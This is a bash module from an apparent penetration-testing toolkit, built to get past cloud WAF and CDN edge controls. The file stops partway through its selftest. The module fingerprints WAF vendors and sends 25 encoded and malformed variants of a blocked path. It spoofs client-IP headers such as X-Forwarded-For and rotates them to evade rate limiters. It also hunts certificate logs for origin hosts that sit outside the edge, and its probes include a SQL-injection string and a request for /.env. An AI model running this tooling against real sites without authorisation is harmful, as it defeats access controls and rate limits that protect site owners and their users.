#!/usr/bin/env bash
# 29_waf_bypass.sh — cloudsting module 29: get past the edge control that is not the origin
# Verbs: --detect <url> | --bypass <url> | --headers <url> | --rate <url> | --origin <host> | --vendors | --variants <path> | --status-tsv | --menu | --selftest
set -u
umask 077

# An inherited CS_MOD_DIR is a caller's directory; deriving it after the core
# is sourced is what keeps every loot path inside this checkout.
unset CS_MOD_DIR

MODULE_ID="29_waf_bypass"
MOD_NAME="Cloud WAF Bypass"
MOD_VERSION="0.1.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/waf_bypass"
mkdir -p "$OUT_DIR" 2>/dev/null || true

MATRIX_FILE="$OUT_DIR/matrix-$RUN_ID.tsv"
EDGE_FILE="$OUT_DIR/edge-$RUN_ID.hdr"

: "${WB_TIMEOUT:=8}"       # per-request wall clock
: "${WB_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/29}"
: "${WB_PATH:=/admin}"     # the path assumed to be blocked
: "${WB_RATE_N:=12}"       # burst size for the rate-limit key test
: "${WB_ORIGIN_TIMEOUT:=10}"

# ── helpers ──────────────────────────────────────────────────────
wb_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

wb_base() {
    local t="${1:-}"
    t="${t#http://}"; t="${t#https://}"; t="${t%%\?*}"; t="${t%%#*}"
    [[ -z "$t" ]] && return 0
    local scheme="https"
    case "${1:-}" in http://*) scheme="http" ;; esac
    # keep the path, drop the trailing slash: a target given as a full URL is
    # the base the caller meant, and cutting at "/" here split it in two.
    t="${t%/}"
    [[ -z "$t" ]] && return 0
    printf '%s://%s' "$scheme" "$t"
}

wb_host() {
    local t="${1:-}"
    t="${t#http://}"; t="${t#https://}"; t="${t%%/*}"
    printf '%s' "$t"
}

# One GET. Sets the W_* globals from the record rather than printing it,
# because the matrix reads four fields per request and a print would need
# another split at every call site.
WB_HF=""
W_CODE=""; W_HASH=""; W_BYTES=""; W_CTYPE=""; W_ERR=""
wb_req() {
    local url="${1:-}"; shift
    local r code secs bytes hash ctype loc bp err
    local keep="${WB_HF:-}"
    r="$(CS_HTTP_HDR_OUT="$keep" cs_http GET "$url" -m "$WB_TIMEOUT" -A "$WB_UA" -P "$@")"
    cs_split "$r" code secs bytes hash ctype loc bp err
    [[ -n "$bp" && -f "$bp" ]] && rm -f "$bp" 2>/dev/null
    W_CODE="${code:-000}"; W_HASH="${hash:-}"; W_BYTES="${bytes:-0}"
    W_CTYPE="${ctype:-}"; W_ERR="${err:-}"
    printf '%s\x1f%s\x1f%s\x1f%s\x1f%s' "$W_CODE" "$W_HASH" "$W_BYTES" "$W_CTYPE" "$W_ERR"
}

# ── vendor fingerprint ───────────────────────────────────────────
# Read from what the server actually sent. Every one of these is a header or a
# cookie an operator cannot fake by accident, so a match is evidence rather
# than a guess.
wb_vendor() {
    local hf="${1:-}"
    [[ -s "$hf" ]] || { printf 'none'; return 0; }
    local h; h="$(tr -d '\r' < "$hf" 2>/dev/null | tr 'A-Z' 'a-z')"

    case "$h" in
        *"server: akamaighost"*|*"x-akamai-transformed"*|*"akamai-origin-hop"*|*"x-akamai-request-id"*) printf 'akamai'; return 0 ;;
    esac
    case "$h" in
        *"server: sucuri"*|*"x-sucuri-id"*|*"x-sucuri-block"*) printf 'sucuri'; return 0 ;;
    esac
    case "$h" in
        *"server: incapsula"*|*"x-iinfo"*|*"incap_ses"*|*"visid_incap"*) printf 'imperva'; return 0 ;;
    esac
    case "$h" in
        *"server: fortiweb"*|*"fortiweb"*) printf 'fortiweb'; return 0 ;;
    esac
    case "$h" in
        *"server: big-ip"*|*"server: bigip"*|*"x-wa-info"*|*"bigipserver"*) printf 'f5'; return 0 ;;
    esac
    case "$h" in
        *"server: barracuda"*|*"barra_counter_session"*) printf 'barracuda'; return 0 ;;
    esac
    case "$h" in
        *"microsoft-azure-application-gateway"*) printf 'azure-appgw'; return 0 ;;
    esac
    case "$h" in
        *"x-azure-ref"*|*"x-fd-int-roxy-purgeid"*|*"x-azure-fdid"*) printf 'azure-frontdoor'; return 0 ;;
    esac
    case "$h" in
        *"x-amzn-waf-action"*|*"x-amzn-requestid"*"awswaf"*) printf 'aws-waf'; return 0 ;;
    esac
    case "$h" in
        *"x-amz-cf-id"*|*"x-amz-cf-pop"*|*"cloudfront.net (cloudfront)"*) printf 'aws-cloudfront'; return 0 ;;
    esac
    case "$h" in
        *"cf-ray"*|*"server: cloudflare"*|*"cf-cache-status"*|*"__cf_bm"*) printf 'cloudflare'; return 0 ;;
    esac
    case "$h" in
        *"x-served-by"*"varnish"*|*"x-fastly-request-id"*|*"fastly-debug"*) printf 'fastly'; return 0 ;;
    esac
    case "$h" in
        *"server: google frontend"*|*"via: 1.1 google"*|*"x-cloud-trace-context"*) printf 'gcp'; return 0 ;;
    esac
    case "$h" in
        *"huaweicloudwaf"*|*"hwwafsesid"*) printf 'huawei-waf'; return 0 ;;
    esac
    case "$h" in
        *"acw_tc"*|*"eagleeye-traceid"*|*"aliyungf_tc"*) printf 'alibaba-waf'; return 0 ;;
    esac
    case "$h" in
        *"x-nws-log-uuid"*|*"stgw"*) printf 'tencent-waf'; return 0 ;;
    esac
    case "$h" in
        *"server: bunnycdn"*) printf 'bunny'; return 0 ;;
    esac
    case "$h" in
        *"x-rdwr"*|*"radware"*) printf 'radware'; return 0 ;;
    esac
    case "$h" in
        *"server: tengine"*|*"x-sp-url"*|*"x-stackpath"*) printf 'other-cdn'; return 0 ;;
    esac
    printf 'none'
}

# Which cloud the edge belongs to. The module's point is that the same bypass
# class applies across providers, so the cloud is reported, not assumed.
wb_cloud() {
    case "${1:-none}" in
        aws-waf|aws-cloudfront)   printf 'aws' ;;
        azure-frontdoor|azure-appgw) printf 'azure' ;;
        gcp)                      printf 'gcp' ;;
        alibaba-waf|huawei-waf|tencent-waf) printf 'alicloud' ;;
        cloudflare|fastly|akamai|bunny) printf 'cdn' ;;
        *)                        printf 'other' ;;
    esac
}

# The header that produced the match, so the report says why it believes this.
wb_vendor_evidence() {
    local hf="${1:-}" v="${2:-none}"
    [[ -s "$hf" ]] || { printf ''; return 0; }
    local keys=""
    case "$v" in
        cloudflare) keys="cf-ray cf-cache-status set-cookie" ;;
        aws-cloudfront) keys="x-amz-cf-id x-amz-cf-pop via" ;;
        aws-waf) keys="x-amzn-waf-action" ;;
        azure-frontdoor) keys="x-azure-ref x-azure-fdid" ;;
        azure-appgw) keys="server" ;;
        gcp) keys="via x-cloud-trace-context server" ;;
        akamai) keys="server x-akamai-transformed" ;;
        fastly) keys="x-served-by x-fastly-request-id" ;;
        imperva) keys="x-iinfo server set-cookie" ;;
        f5) keys="server x-wa-info" ;;
        fortiweb) keys="server" ;;
        sucuri) keys="x-sucuri-id server" ;;
        huawei-waf) keys="set-cookie server" ;;
        alibaba-waf) keys="set-cookie eagleeye-traceid" ;;
        tencent-waf) keys="x-nws-log-uuid" ;;
        *) keys="" ;;
    esac
    local k line
    for k in $keys; do
        line="$(tr -d '\r' < "$hf" 2>/dev/null | grep -i "^${k}:" | head -1)"
        [[ -n "$line" ]] && { printf '%s' "${line%%:*}"; return 0; }
    done
    printf ''
}

# ── the normalisation matrix ─────────────────────────────────────
# Every variant is a path the origin and the WAF may disagree about. The label
# is what the report shows; the path is what leaves the box, unnormalised.
wb_variants() {
    local p="${1:-$WB_PATH}"
    [[ "$p" == /* ]] || p="/$p"
    local bare="${p#/}"
    local longpad; longpad="$(printf 'a%.0s' $(seq 1 3800))"

    printf 'exact\x1f%s\n'      "$p"
    printf 'trailing-slash\x1f%s/\n' "$p"
    printf 'dot-prefix\x1f/./%s\n'   "$bare"
    printf 'dot-inner\x1f/a/../%s\n' "$bare"
    printf 'dotdot-inner\x1f/x/%%2e%%2e/%s\n' "$bare"
    printf 'double-slash\x1f//%s\n'  "$bare"
    printf 'double-slash-inner\x1f/%s//x\n' "$bare"
    printf 'enc-dot\x1f/%%2e/%s\n'   "$bare"
    printf 'enc-slash\x1f/%%2f%s\n'  "$bare"
    printf 'enc-slash-trail\x1f%s%%2f\n' "$p"
    printf 'double-enc-dot\x1f/%%252e/%s\n' "$bare"
    printf 'upper-case\x1f%s\n'      "$(printf '%s' "$p" | tr 'a-z' 'A-Z')"
    printf 'mixed-case\x1f%s\n'      "$(wb_mixedcase "$p")"
    printf 'semicolon\x1f%s;/\n'     "$p"
    printf 'semi-prefix\x1f/;%s\n'   "$bare"
    printf 'semi-dots\x1f%s..;/\n'   "$p"
    printf 'trailing-dot\x1f%s.\n'   "$p"
    printf 'trailing-space\x1f%s%%20\n' "$p"
    printf 'enc-tab\x1f/%%09%s\n'    "$bare"
    printf 'null-suffix\x1f%s%%00.png\n' "$p"
    printf 'backslash\x1f%s\\\n'     "$p"
    printf 'question-wrap\x1f%s%%3f\n' "$p"
    printf 'hash-wrap\x1f%s%%23\n'   "$p"
    printf 'long-prefix\x1f/%s%s\n'  "$longpad" "$p"
    printf 'long-suffix\x1f%s/%s\n'  "$p" "$longpad"
}

# Alternate the case of the last segment so the string differs from both the
# exact path and the all-upper form.
wb_mixedcase() {
    local p="${1:-}" out="" i c
    for ((i = 0; i < ${#p}; i++)); do
        c="${p:i:1}"
        if (( i % 2 == 0 )); then out+="${c^^}"; else out+="${c,,}"; fi
    done
    printf '%s' "$out"
}

# The single decision the whole module rests on. Inputs are measured, never
# assumed:
#   control  — what the origin says to a path that does not exist
#   block    — what the edge says to a path it refuses
# A variant is a bypass only when the edge's refusal signature is absent AND
# the origin's own answer is present. Anything else is ambiguous and is
# reported as such instead of being counted as a win.
wb_classify() {
    local cc="${1:-}" ch="${2:-}" bc="${3:-}" bh="${4:-}" vc="${5:-}" vh="${6:-}"
    if [[ -z "$bc" || -z "$bh" || ( "$bc" == "$cc" && "$bh" == "$ch" ) ]]; then
        printf 'no-edge'; return 0
    fi
    if [[ "$vc" == "$bc" && "$vh" == "$bh" ]]; then printf 'blocked'; return 0; fi
    if [[ "$vc" == "$cc" && "$vh" == "$ch" ]]; then printf 'bypass'; return 0; fi
    # A variant that reaches a real resource is neither: the edge let it
    # through and the origin had something to say about it.
    if [[ "$vc" != "$bc" && "$vc" != "000" ]]; then printf 'reached-origin'; return 0; fi
    printf 'ambiguous'
}

# ── detect ───────────────────────────────────────────────────────
wb_probe_paths() { printf '/.env\n/wp-admin/\n/?x=1%%27%%20OR%%20%%271%%27=%%271\n'; }

# Find the refusal signature, if there is one. Prints
#   <control-code> <control-hash> <block-code> <block-hash> <block-path>
# and prints nothing when no refusal could be measured.
#
# The trap this exists to avoid: an application that echoes the requested path
# in its 404 page answers every probe with a *different* body, so "this
# response differs from the control" is true for every path and proves
# nothing. A real block page is path-independent — send two refused paths and
# the edge returns the same bytes twice. That agreement is the signature. A
# lone candidate is accepted only when its status is a refusal the origin does
# not send for a path it does not have, and never when the origin refuses the
# control probe too: that is an edge blocking the caller, not the request.
wb_block_sig() {
    local base="${1:-}"
    wb_req "$base/wb-ctrl-$RUN_ID-doesnotexist" > /dev/null
    local cc="$W_CODE" ch="$W_HASH"

    local probes="$CS_SCRATCH/wb-probes-$RUN_ID.tsv"
    { wb_probe_paths; printf '%s\n' "${2:-$WB_PATH}"; } > "$probes"

    local p sc="" sh="" sp="" first_code="" first_hash="" first_path=""
    while IFS= read -r p; do
        [[ -z "$p" ]] && continue
        wb_req "$base$p" > /dev/null
        local c="$W_CODE" h="$W_HASH"
        # identical to the control: the origin answered and the edge never saw it
        [[ "$c" == "$cc" && "$h" == "$ch" ]] && continue
        if [[ -z "$first_path" ]]; then first_code="$c"; first_hash="$h"; first_path="$p"; fi
        # two different paths, one body: this is a block page
        if [[ -n "$sc" && "$c" == "$sc" && "$h" == "$sh" ]]; then
            printf '%s\x1f%s\x1f%s\x1f%s\x1f%s' "$cc" "$ch" "$c" "$h" "$sp"
            return 0
        fi
        if [[ -z "$sc" ]]; then sc="$c"; sh="$h"; sp="$p"; fi
    done < "$probes"

    if [[ -n "$first_path" ]]; then
        case "$first_code" in
            403|406|418|429|451|503)
                case "$cc" in
                    403|406|418|429|451|503) return 1 ;;
                    *) printf '%s\x1f%s\x1f%s\x1f%s\x1f%s' \
                           "$cc" "$ch" "$first_code" "$first_hash" "$first_path"
                       return 0 ;;
                esac
                ;;
        esac
    fi
    return 1
}

# An edge that answers the control probe with a refusal is refusing the
# caller, not the path. Saying so is more useful than a silent "no signature".
wb_edge_refuses_all() {
    case "${1:-}" in 403|406|418|429|451|503) return 0 ;; esac
    return 1
}

wb_cmd_detect() {
    local target="${1:-}"
    [[ -z "$target" ]] && { printf 'usage: 29_waf_bypass.sh --detect <url>\n' >&2; return 2; }
    cs_have curl || { cs_row ERROR "missing tool: curl"; return 3; }

    local base; base="$(wb_base "$target")"
    [[ -z "$base" ]] && { cs_row ERROR "unparseable target: $target"; return 2; }
    cs_row TARGET "$base"

    WB_HF="$EDGE_FILE"
    : > "$EDGE_FILE"
    wb_req "$base/" > /dev/null
    local root_code="$W_CODE"
    WB_HF=""
    cs_row ROOT "$root_code" "$W_HASH" "$W_BYTES"

    local vendor; vendor="$(wb_vendor "$EDGE_FILE")"
    local cloud;  cloud="$(wb_cloud "$vendor")"
    local ev;     ev="$(wb_vendor_evidence "$EDGE_FILE" "$vendor")"
    cs_row VENDOR "$vendor"
    cs_row CLOUD "$cloud"
    cs_row EVIDENCE "${ev:-none}"

    local sig cc ch bc bh bp
    sig="$(wb_block_sig "$base")"
    if [[ -z "$sig" ]]; then
        cs_row ENFORCING "no"
        if wb_edge_refuses_all "$root_code"; then
            cs_row SUMMARY "edge refuses the caller ($root_code): the origin is unreachable, nothing to measure"
        else
            cs_row SUMMARY "no block signature: every probe answered like the origin"
        fi
        if [[ "$vendor" != "none" ]]; then
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "MEDIUM" "edge-not-enforcing:$vendor" \
                "$vendor is in front yet every hostile probe answered like the origin" > /dev/null
        fi
        return 1
    fi
    cs_split "$sig" cc ch bc bh bp
    cs_row CONTROL "$cc" "$ch"
    cs_row ENFORCING "yes"
    cs_row BLOCK_SIG "$bc" "$bh" "$bp"
    cs_row SUMMARY "vendor=$vendor cloud=$cloud refuses=$bp:$bc"

    if [[ "$vendor" == "none" ]]; then
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "MEDIUM" "edge-unidentified:$bc" \
            "no CDN/WAF header signature, yet $bp was refused $bc" > /dev/null
    else
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "LOW" "waf-in-front:$vendor" \
            "$vendor in front, evidence header ${ev:-none}" > /dev/null
    fi
    return 0
}

# ── bypass ───────────────────────────────────────────────────────
wb_cmd_bypass() {
    local target="${1:-}" path="${2:-$WB_PATH}"
    [[ -z "$target" ]] && { printf 'usage: 29_waf_bypass.sh --bypass <url> [path]\n' >&2; return 2; }
    cs_have curl || { cs_row ERROR "missing tool: curl"; return 3; }

    local base; base="$(wb_base "$target")"
    [[ -z "$base" ]] && { cs_row ERROR "unparseable target: $target"; return 2; }
    [[ "$path" == /* ]] || path="/$path"
    cs_row TARGET "$base"
    cs_row PATH "$path"

    # ── establish both signatures first ──
    local sig cc ch bc bh bp
    sig="$(wb_block_sig "$base" "$path")"
    if [[ -z "$sig" ]]; then
        cs_row EDGE "none"
        cs_row SUMMARY "no refusal to bypass: every probe answered like the origin"
        # Not a finding. A target with no edge control is not a bypass, and
        # recording one here is exactly the false positive this check exists
        # to prevent.
        return 1
    fi
    cs_split "$sig" cc ch bc bh bp
    cs_row CONTROL "$cc" "$ch"
    cs_row EDGE "refusing" "$bc" "$bp"
    cs_row BLOCK_SIG "$bc" "$bh"

    : > "$MATRIX_FILE"
    local total=0 bypass=0 reached=0 blocked=0 ambig=0
    local label vpath verdict
    while IFS=$'\x1f' read -r label vpath; do
        [[ -z "$label" ]] && continue
        total=$((total + 1))
        wb_req "$base$vpath" > /dev/null
        verdict="$(wb_classify "$cc" "$ch" "$bc" "$bh" "$W_CODE" "$W_HASH")"
        printf '%s\t%s\t%s\t%s\t%s\n' "$label" "$W_CODE" "$W_BYTES" "$verdict" "$vpath" >> "$MATRIX_FILE"
        cs_row VARIANT "$label" "$W_CODE" "$verdict"
        case "$verdict" in
            bypass)
                bypass=$((bypass + 1))
                cs_findings_row "$MODULE_ID" "WEBAPI" "$base$vpath" "CRITICAL" "waf-bypass:$label" \
                    "$label form of $path reached the origin ($W_CODE) while $path was refused $bc" > /dev/null
                ;;
            reached-origin)
                reached=$((reached + 1))
                # A 2xx means a real resource answered through the gap; an
                # error page only means the rule was missed. Same mechanism,
                # different amount of ground gained.
                case "$W_CODE" in
                    2??|3??)
                        cs_findings_row "$MODULE_ID" "WEBAPI" "$base$vpath" "HIGH" "waf-reached-origin:$label" \
                            "$label form returned $W_CODE from the origin while $bp was refused $bc" > /dev/null
                        ;;
                    *)
                        cs_findings_row "$MODULE_ID" "WEBAPI" "$base$vpath" "MEDIUM" "waf-rule-missed:$label" \
                            "$label form reached the origin ($W_CODE) while $bp was refused $bc" > /dev/null
                        ;;
                esac
                ;;
            blocked)  blocked=$((blocked + 1)) ;;
            ambiguous) ambig=$((ambig + 1)) ;;
        esac
    done < <(wb_variants "$path")

    cs_row SUMMARY "variants=$total bypass=$bypass reached=$reached blocked=$blocked ambiguous=$ambig"
    cs_row ARTIFACT "$MATRIX_FILE"
    (( bypass > 0 )) && return 0 || return 1
}

# ── header trust ────────────────────────────────────────────────
# The edge decides who you are from a header. If the origin trusts it too, the
# header is an authorization input and every IP allowlist in front is
# cosmetic. Reflected means the app echoed the value back; that is proof, a
# status change is a hint.
wb_cmd_headers() {
    local target="${1:-}"
    [[ -z "$target" ]] && { printf 'usage: 29_waf_bypass.sh --headers <url>\n' >&2; return 2; }
    cs_have curl || { cs_row ERROR "missing tool: curl"; return 3; }

    local base; base="$(wb_base "$target")"
    [[ -z "$base" ]] && { cs_row ERROR "unparseable target: $target"; return 2; }
    cs_row TARGET "$base"

    wb_req "$base/" > /dev/null
    local c0="$W_CODE" b0="$W_BYTES"
    cs_row BASELINE "$c0" "$b0"

    local marker="127.0.0.1-cs$RANDOM"
    local hdr trusted=0
    for hdr in \
        "X-Forwarded-For: $marker" \
        "X-Real-IP: $marker" \
        "True-Client-IP: $marker" \
        "CF-Connecting-IP: $marker" \
        "X-Client-IP: $marker" \
        "X-Originating-IP: $marker" \
        "X-Remote-IP: $marker" \
        "Forwarded: for=$marker" \
        "X-Forwarded-Host: cs-$marker.example" \
        "X-Host: cs-$marker.example" \
        "X-Forwarded-Proto: https" \
        "X-HTTP-Method-Override: PUT"
    do
        local name="${hdr%%:*}"
        wb_req "$base/" -H "$hdr" > /dev/null
        local code="$W_CODE" bytes="$W_BYTES" hash="$W_HASH"
        local verdict="ignored"
        # The body is gone by the time we get here, so trust is measured two
        # ways that survive it: the response changed at all, or the status did.
        if [[ "$bytes" != "$b0" ]]; then
            verdict="changed-body"
        elif [[ "$code" != "$c0" ]]; then
            verdict="changed-status"
        fi
        cs_row HEADER "$name" "$code" "$bytes" "$verdict"
        if [[ "$verdict" != "ignored" ]]; then
            trusted=$((trusted + 1))
            cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "MEDIUM" "proxy-header-honoured:$name" \
                "$name changed the response ($c0/$b0 -> $code/$bytes)" > /dev/null
        fi
    done

    # A header the app reflects is stronger evidence than one that merely
    # changes the body, so it is checked directly against a fresh request.
    local rp="$CS_SCRATCH/wb-hdr-$RUN_ID"
    local r
    r="$(CS_HTTP_HDR_OUT="$rp" cs_http GET "$base/" -m "$WB_TIMEOUT" -A "$WB_UA" \
            -H "X-Forwarded-For: $marker" -o "$CS_SCRATCH/wb-body-$RUN_ID")"
    if grep -qF "$marker" "$CS_SCRATCH/wb-body-$RUN_ID" 2>/dev/null; then
        cs_row REFLECTED "X-Forwarded-For"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base" "HIGH" "xff-reflected" \
            "the application echoes the client-supplied X-Forwarded-For value" > /dev/null
    else
        cs_row REFLECTED "none"
    fi
    rm -f "$rp" "$CS_SCRATCH/wb-body-$RUN_ID" 2>/dev/null

    cs_row SUMMARY "$trusted"
    return 0
}

# ── rate-limit key ──────────────────────────────────────────────
# A limiter keyed on the client address is keyed on a header the client
# controls. The evidence is a delta: the same burst, once plain and once with
# the address rotated, and the number of refusals in each.
wb_cmd_rate() {
    local target="${1:-}" path="${2:-/}"
    [[ -z "$target" ]] && { printf 'usage: 29_waf_bypass.sh --rate <url> [path]\n' >&2; return 2; }
    cs_have curl || { cs_row ERROR "missing tool: curl"; return 3; }

    local base; base="$(wb_base "$target")"
    [[ -z "$base" ]] && { cs_row ERROR "unparseable target: $target"; return 2; }
    [[ "$path" == /* ]] || path="/$path"
    cs_row TARGET "$base"
    cs_row PATH "$path"
    cs_row BURST "$WB_RATE_N"

    local plain_limited=0 i
    for ((i = 1; i <= WB_RATE_N; i++)); do
        wb_req "$base$path" > /dev/null
        case "$W_CODE" in 429|503) plain_limited=$((plain_limited + 1)) ;; esac
    done
    cs_row PLAIN "refusals=$plain_limited/$WB_RATE_N"

    local rot_limited=0
    for ((i = 1; i <= WB_RATE_N; i++)); do
        wb_req "$base$path" -H "X-Forwarded-For: 10.0.$((i % 250)).$((RANDOM % 250 + 1))" > /dev/null
        case "$W_CODE" in 429|503) rot_limited=$((rot_limited + 1)) ;; esac
    done
    cs_row ROTATED "refusals=$rot_limited/$WB_RATE_N"

    if (( plain_limited == 0 )); then
        cs_row VERDICT "not-limiting"
        return 1
    fi
    if (( rot_limited < plain_limited )); then
        cs_row VERDICT "header-keyed"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$base$path" "HIGH" "rate-limit-header-bypass" \
            "rotating X-Forwarded-For cut refusals from $plain_limited to $rot_limited of $WB_RATE_N" > /dev/null
        return 0
    fi
    cs_row VERDICT "enforced"
    return 0
}

# ── origin exposure ─────────────────────────────────────────────
# The edge protects a name, not an address. If a certificate in transparency
# logs names a host that answers without the edge's headers, the WAF is
# optional.
wb_cmd_origin() {
    local target="${1:-}"
    [[ -z "$target" ]] && { printf 'usage: 29_waf_bypass.sh --origin <host|url>\n' >&2; return 2; }
    local host; host="$(wb_host "$target")"
    [[ -z "$host" ]] && { cs_row ERROR "unparseable target: $target"; return 2; }
    cs_row HOST "$host"

    # 1. Where does the name actually point?
    local cname=""
    if cs_have dig; then
        cname="$(dig +short CNAME "$host" 2>/dev/null | tail -1)"
        local addrs; addrs="$(dig +short A "$host" 2>/dev/null | tr '\n' ' ')"
        cs_row CNAME "${cname:-none}"
        cs_row A "${addrs:-none}"
    else
        cs_row CNAME "dig-missing"
    fi
    local edge="none"
    case "$cname" in
        *cloudfront.net*)    edge="aws-cloudfront" ;;
        *azurefd.net*)       edge="azure-frontdoor" ;;
        *trafficmanager.net*) edge="azure-frontdoor" ;;
        *cdn.cloudflare.net*) edge="cloudflare" ;;
        *akamai*)            edge="akamai" ;;
        *fastly.net*)        edge="fastly" ;;
        *edgekey.net*|*edgesuite.net*) edge="akamai" ;;
    esac
    cs_row EDGE_CNAME "$edge"

    # 2. Names that share a certificate with this host. An origin usually keeps
    #    one certificate for both the proxied and the direct name.
    local names="$CS_SCRATCH/wb-crtsh-$RUN_ID.txt"
    : > "$names"
    if cs_have curl; then
        local r code secs bytes hash ctype loc bp err
        r="$(cs_http GET "https://crt.sh/?q=%25.${host}&output=json" -m "$WB_ORIGIN_TIMEOUT" -A "$WB_UA")"
        cs_split "$r" code secs bytes hash ctype loc bp err
        if [[ "$code" == "200" && -f "$bp" ]]; then
            grep -oE '"name_value":"[^"]+"' "$bp" 2>/dev/null \
                | sed -e 's/^"name_value":"//' -e 's/"$//' \
                | tr '\n' '\n' | tr ',' '\n' | tr 'A-Z' 'a-z' \
                | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
                | grep -vE '^\*|^$' | sort -u > "$names"
        fi
        [[ -f "$bp" ]] && rm -f "$bp" 2>/dev/null
    fi
    local n; n="$(wc -l < "$names" 2>/dev/null | tr -d ' ')"
    cs_row CERT_NAMES "${n:-0}"

    # 3. Does one of those names answer without the edge? The check is the
    #    edge's own signature header, so it is measured, not guessed.
    local tried=0 exposed=0 name
    if (( ${n:-0} > 0 )); then
        while IFS= read -r name; do
            [[ -z "$name" ]] && continue
            [[ "$name" == "$host" ]] && continue
            (( tried >= 12 )) && break
            tried=$((tried + 1))
            local hf="$CS_SCRATCH/wb-origin-$RUN_ID.hdr"
            WB_HF="$hf"; : > "$hf"
            wb_req "https://$name/" > /dev/null
            local oc="$W_CODE" ov; ov="$(wb_vendor "$hf")"
            WB_HF=""
            [[ "$oc" == "000" ]] && continue
            cs_row CERT_HOST "$name" "$oc" "$ov"
            if [[ "$ov" == "none" && "$edge" != "none" ]]; then
                exposed=$((exposed + 1))
                cs_findings_row "$MODULE_ID" "SURFACE" "https://$name" "HIGH" "origin-without-edge:$name" \
                    "$name shares a certificate with $host and answers $oc with no edge header" > /dev/null
            fi
        done < "$names"
    fi
    cs_row SUMMARY "tried=$tried exposed=$exposed"
    return 0
}

# ── introspection ───────────────────────────────────────────────
wb_cmd_vendors() {
    local v
    for v in cloudflare aws-cloudfront aws-waf azure-frontdoor azure-appgw gcp \
             akamai fastly imperva f5 fortiweb sucuri barracuda radware \
             alibaba-waf huawei-waf tencent-waf bunny; do
        cs_row VENDOR "$v" "$(wb_cloud "$v")"
    done
    return 0
}

wb_cmd_variants() {
    local path="${1:-$WB_PATH}"
    local label vpath n=0
    while IFS=$'\x1f' read -r label vpath; do
        [[ -z "$label" ]] && continue
        n=$((n + 1))
        # The long ones would flood a terminal, so the printed path is clipped
        # while the row still says which label it is.
        local shown="${vpath:0:60}"; (( ${#vpath} > 60 )) && shown="${shown}…"
        cs_row VARIANT "$label" "$shown"
    done < <(wb_variants "$path")
    cs_row SUMMARY "$n"
    return 0
}

wb_cmd_status_tsv() {
    local c; cs_have curl && c="ok" || c="missing"
    printf '%s\t%s\tcurl-%s\tvariants-%s\tpath-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$c" "$(wb_variants "$WB_PATH" | wc -l | tr -d ' ')" "$WB_PATH"
}

wb_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

wb_cmd_help() {
    cat <<'HELP'
cloudsting module 29 — Cloud WAF Bypass v0.1.0
  --detect  <host|url>        name the edge in front and whether it refuses anything
  --bypass  <host|url> [path] 25 normalisation variants of a refused path
  --headers <host|url>        which proxy headers the origin actually honours
  --rate    <host|url> [path] burst with and without a rotated client address
  --origin  <host|url>        certificate-transparency search for a name that
                              answers without the edge
  --variants [path]           print the variant list without sending anything
  --vendors                   print the vendor table this module recognises
  --status-tsv                module status
  --menu                      menu entry
  --selftest                  run selftests
  --help                      this message

Every verdict is a delta against two measured signatures taken first: what the
origin says to a path that does not exist, and what the edge says to a path it
refuses. A variant is only called a bypass when the edge's refusal signature is
absent and the origin's own answer is present — anything else is reported as
ambiguous rather than counted as a win. If the probes show no refusal at all,
the module says so and records nothing: an unprotected target is not a bypass.

Recognised edges: Cloudflare, AWS CloudFront and WAF, Azure Front Door and
Application Gateway, Google Cloud (Cloud Armor sits behind Google Frontend),
Akamai, Fastly, Imperva, F5, FortiWeb, Sucuri, Barracuda, Radware, Alibaba,
Huawei and Tencent WAF.

Environment: WB_TIMEOUT (8), WB_UA, WB_PATH (/admin), WB_RATE_N (12)
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
wb_selftest() {
    cs_selftest_reset
    local real_loot="$CS_LOOT"
    CS_LOOT="$CS_SCRATCH"
    mkdir -p "$CS_LOOT"

    # ── base and host parsing ──
    chk base-bare   "$(wb_base example.com)"            "https://example.com"
    chk base-http   "$(wb_base http://x.y/z)"           "http://x.y/z"
    chk base-https  "$(wb_base https://x.y/a/b)"        "https://x.y/a/b"
    chk base-trail  "$(wb_base https://x.y/a/)"         "https://x.y/a"
    chk base-query  "$(wb_base 'https://x.y/p?q=1')"    "https://x.y/p"
    chk base-empty  "$(wb_base '')"                     ""
    chk host-full   "$(wb_host https://a.b:8443/x/y)"   "a.b:8443"
    chk host-bare   "$(wb_host a.b)"                    "a.b"

    # ── vendor fingerprint from synthetic headers ──
    local h="$CS_SCRATCH/wb-h.txt"

    printf 'HTTP/2 200\r\nserver: cloudflare\r\ncf-ray: 8a1b2c3d4e5f-FRA\r\n\r\n' > "$h"
    chk vendor-cf "$(wb_vendor "$h")" "cloudflare"
    chk cloud-cf  "$(wb_cloud cloudflare)" "cdn"
    chk evid-cf   "$(wb_vendor_evidence "$h" cloudflare)" "cf-ray"

    printf 'HTTP/1.1 200 OK\r\nX-Amz-Cf-Id: abc\r\nVia: 1.1 d111111abcdef8.cloudfront.net (CloudFront)\r\n\r\n' > "$h"
    chk vendor-cf-aws "$(wb_vendor "$h")" "aws-cloudfront"
    chk cloud-cf-aws  "$(wb_cloud aws-cloudfront)" "aws"

    printf 'HTTP/1.1 403 Forbidden\r\nx-amzn-waf-action: challenge\r\n\r\n' > "$h"
    chk vendor-awswaf "$(wb_vendor "$h")" "aws-waf"

    printf 'HTTP/1.1 200 OK\r\nx-azure-ref: 0abc\r\n\r\n' > "$h"
    chk vendor-afd "$(wb_vendor "$h")" "azure-frontdoor"
    chk cloud-afd  "$(wb_cloud azure-frontdoor)" "azure"

    printf 'HTTP/1.1 200 OK\r\nServer: Microsoft-Azure-Application-Gateway/v2\r\n\r\n' > "$h"
    chk vendor-appgw "$(wb_vendor "$h")" "azure-appgw"

